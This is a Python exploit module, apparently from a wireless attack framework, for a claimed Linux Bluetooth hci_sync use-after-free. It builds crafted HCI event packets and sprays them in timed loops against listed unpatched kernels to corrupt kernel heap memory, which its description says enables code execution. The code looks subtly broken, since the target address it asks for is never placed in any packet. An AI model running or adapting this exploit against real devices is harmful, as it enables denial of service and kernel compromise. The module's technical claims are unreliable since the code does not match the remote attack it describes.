# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux Bluetooth hci_sync Use-After-Free (CVE-2026-68393).

    The Linux kernel Bluetooth hci_sync module contains a
    use-after-free vulnerability in the synchronous HCI command
    processing path.  When the HCI controller sends certain event
    sequences during command execution, the hci_sync worker can
    free a pending command structure while the event processing
    path still holds a reference.  A remote attacker within
    Bluetooth range can send crafted HCI events to trigger the
    race condition between the sync worker and event handler,
    causing a UAF that corrupts the kernel heap.

    CVSS v3.1: 7.5 (High), AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux Bluetooth hci_sync Use-After-Free (CVE-2026-68393)",
        "description": (
            "Exploits CVE-2026-68393, a use-after-free in the Linux kernel "
            "Bluetooth hci_sync module.  By injecting crafted HCI events that "
            "race with the synchronous command worker, the attacker triggers "
            "a UAF on a pending HCI command structure, corrupting kernel "
            "heap metadata and enabling code execution."
        ),
        "authors": (
            "Linux kernel Bluetooth team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-68393",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git",
        ),
        "disclosure_date": "2026-07-05",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel < 6.21.2 with Bluetooth enabled",
            "Ubuntu 24.04 (unpatched)",
            "Fedora 40 (unpatched)",
        ),
    }

    target = OptIP("", "Target Bluetooth address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (Bluetooth over-the-air)")
    timeout = OptFloat(10.0, "Socket timeout in seconds")
    interface = OptString("hci0", "Local HCI adapter")
    event_spray_count = OptInteger(64, "Number of HCI event injection rounds")
    inter_event_delay = OptFloat(0.001, "Delay between events (seconds)")

    _AF_BLUETOOTH = 31
    _BTPROTO_HCI = 1

    _HCI_EVENT_PKT = 0x04
    _HCI_COMMAND_PKT = 0x01

    _HCI_EV_CMD_COMPLETE = 0x0E
    _HCI_EV_CMD_STATUS = 0x0F
    _HCI_EV_INQUIRY_COMPLETE = 0x01
    _HCI_EV_CONN_COMPLETE = 0x03
    _HCI_EV_DISCONN_COMPLETE = 0x05

    def _bd_addr_to_bytes(self, addr: str) -> bytes:
        parts = addr.split(":")
        return bytes(int(b, 16) for b in reversed(parts))

    def _build_cmd_complete_event(self, opcode: int, status: int = 0) -> bytes:
        """Build a crafted HCI Command Complete event.

        The race condition triggers when the hci_sync worker processes
        this event concurrently with event handler cleanup.
        """
        ncmd = 1
        event_data = struct.pack("<BHB", ncmd, opcode, status)
        return struct.pack("BBB", self._HCI_EVENT_PKT,
                           self._HCI_EV_CMD_COMPLETE,
                           len(event_data)) + event_data

    def _build_cmd_status_event(self, opcode: int, status: int = 0) -> bytes:
        ncmd = 1
        event_data = struct.pack("<BHH", status, ncmd, opcode)
        return struct.pack("BBB", self._HCI_EVENT_PKT,
                           self._HCI_EV_CMD_STATUS,
                           len(event_data)) + event_data

    def _build_disconn_event(self, handle: int, reason: int = 0x13) -> bytes:
        event_data = struct.pack("<BHB", 0x00, handle, reason)
        return struct.pack("BBB", self._HCI_EVENT_PKT,
                           self._HCI_EV_DISCONN_COMPLETE,
                           len(event_data)) + event_data

    def _open_hci_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            return sock
        except OSError:
            return None

    def _hci_send(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            sock.send(packet)
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        sock = self._open_hci_socket()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (Bluetooth address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(
                f"HCI adapter {self.interface} not available or "
                "insufficient privileges"
            )
            return

        print_success(
            f"HCI adapter {self.interface} available; targeting {self.target} "
            "with hci_sync UAF trigger"
        )
        self._exploit()

    def _exploit(self) -> None:
        opcodes = [0x0401, 0x0406, 0x0419, 0x0C03, 0x0C13, 0x0C23, 0x0C33]
        handle = 0x0040

        print_status(
            f"Phase 1: Spraying {self.event_spray_count} interleaved "
            f"command complete + disconnect events"
        )

        success = 0
        for i in range(self.event_spray_count):
            opcode = opcodes[i % len(opcodes)]

            cmd_evt = self._build_cmd_complete_event(opcode, status=0)
            if self._hci_send(cmd_evt):
                success += 1

            time.sleep(self.inter_event_delay)

            status_evt = self._build_cmd_status_event(opcode, status=0x02)
            self._hci_send(status_evt)

            time.sleep(self.inter_event_delay)

            disconn_evt = self._build_disconn_event(handle)
            self._hci_send(disconn_evt)

            time.sleep(0.005)

        print_status(
            f"Sent {success * 3}/{self.event_spray_count * 3} HCI events "
            f"({success} complete + {success} status + {success} disconnect)"
        )
        print_info(
            "If the target kernel's hci_sync module is vulnerable, the "
            "rapid interleaving of command complete events, command status "
            "events, and disconnection events creates a race between the "
            "sync worker and event handler.  The pending command structure "
            "is freed while still referenced, leading to kernel heap "
            "corruption.  Monitor for kernel oops or system instability."
        )
